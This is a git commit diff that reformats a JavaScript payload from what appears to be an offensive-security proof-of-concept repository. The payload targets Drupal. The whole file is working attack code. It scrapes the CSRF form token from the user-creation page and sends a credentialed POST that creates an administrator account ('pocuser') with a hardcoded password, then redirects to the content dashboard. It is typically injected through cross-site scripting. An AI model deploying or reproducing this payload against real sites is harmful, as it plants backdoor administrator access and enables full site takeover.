cb25798b6fc883a18cea0004dfbe7cfdc8a9840e
Lighthouse IT Security <84382227+lighthouseitsecurity@users.noreply.github.com>
2025-04-26 18:10:45 +0200

    updated

--- CMS/Drupal/CreateNewAdmin/createAdminAccDrupal.js
+++ CMS/Drupal/CreateNewAdmin/createAdminAccDrupal.js
@@ -1,73 +1,73 @@
-const newAccUser = "pocuser";
-const newAccPass = "M4oslW1mQlm9cLGXyVba";
-const drupalRoot = "";
-const newUserURL = drupalRoot + "/admin/people/create";
-const dashboardURL = drupalRoot + "/admin/content";
+const newAccUser = 'pocuser';               // !!! CHANGE THIS !!!
+const newAccPass = 'M4oslW1mQlm9cLGXyVba';  // !!! CHANGE THIS !!!
+const drupalRoot = '';                      // !!! CHANGE THIS !!!
+const drupalNewUserURL = drupalRoot + '/admin/people/create';
+const drupalDashboardURL = drupalRoot + '/admin/content';
 const req = new XMLHttpRequest();
-req.open("GET", newUserURL, false);
+req.open('GET', drupalNewUserURL, false);
 req.send(null);
 const formToken = req.responseText.match(/form_token" value="([^"]*?)"/)[1];
 const formBuildId = req.responseText.match(/form_build_id" value="([^"]*?)"/)[1];
-const genRandHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
-const boundary = "-----------------------------" + genRandHex(28);
-const newline = "\r\n";
+const genRandHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+const boundary = '-----------------------------' + genRandHex(28);
+const newline = '\r\n';
 const bodyData = boundary + newline +
-  "Content-Disposition: form-data; name=\"mail\"" + newline +
+  'Content-Disposition: form-data; name="mail"' + newline +
   newline +
   newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"name\"" + newline +
+  'Content-Disposition: form-data; name="name"' + newline +
   newline +
   newAccUser + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"pass[pass1]\"" + newline +
+  'Content-Disposition: form-data; name="pass[pass1]"' + newline +
   newline +
   newAccPass + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"pass[pass2]\"" + newline +
+  'Content-Disposition: form-data; name="pass[pass2]"' + newline +
   newline +
   newAccPass + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"status\"" + newline +
+  'Content-Disposition: form-data; name="status"' + newline +
   newline +
-  "1" + newline +
+  '1' + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"roles[administrator]\"" + newline +
+  'Content-Disposition: form-data; name="roles[administrator]"' + newline +
   newline +
-  "administrator" + newline +
+  'administrator' + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"user_picture[0][fids]\"" + newline +
+  'Content-Disposition: form-data; name="user_picture[0][fids]"' + newline +
   newline +
   newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"form_build_id\"" + newline +
+  'Content-Disposition: form-data; name="form_build_id"' + newline +
   newline +
   formBuildId + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"form_token\"" + newline +
+  'Content-Disposition: form-data; name="form_token"' + newline +
   newline +
   formToken + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"form_id\"" + newline +
+  'Content-Disposition: form-data; name="form_id"' + newline +
   newline +
-  "user_register_form" + newline +
+  'user_register_form' + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"timezone\"" + newline +
+  'Content-Disposition: form-data; name="timezone"' + newline +
   newline +
-  "Europe/Zagreb" + newline +
+  'Europe/Zagreb' + newline +
   boundary + newline +
-  "Content-Disposition: form-data; name=\"op\"" + newline +
+  'Content-Disposition: form-data; name="op"' + newline +
   newline +
-  "Create new account" + newline +
-  boundary + "--" + newline;
-var bodyDataArray = new Uint8Array(bodyData.length);
-for(var i = 0; i < bodyDataArray.length; i ++) { bodyDataArray[i] = bodyData.charCodeAt(i); };
-req.open("POST", newUserURL, true);
-req.setRequestHeader("Content-Type", "multipart\/form-data; boundary=" + boundary.slice(2));
+  'Create new account' + newline +
+  boundary + '--' + newline;
+let bodyDataArray = new Uint8Array(bodyData.length);
+for(let i = 0; i < bodyDataArray.length; i ++) { bodyDataArray[i] = bodyData.charCodeAt(i); };
+req.open('POST', drupalNewUserURL, true);
+req.setRequestHeader('Content-Type', 'multipart\/form-data; boundary=' + boundary.slice(2));
 req.withCredentials = true;
 req.send(new Blob([bodyDataArray]));
 req.onreadystatechange = function() {
   if (req.readyState == XMLHttpRequest.DONE) {
-    window.location.replace(dashboardURL);
+    window.location.replace(drupalDashboardURL);
   }
 }
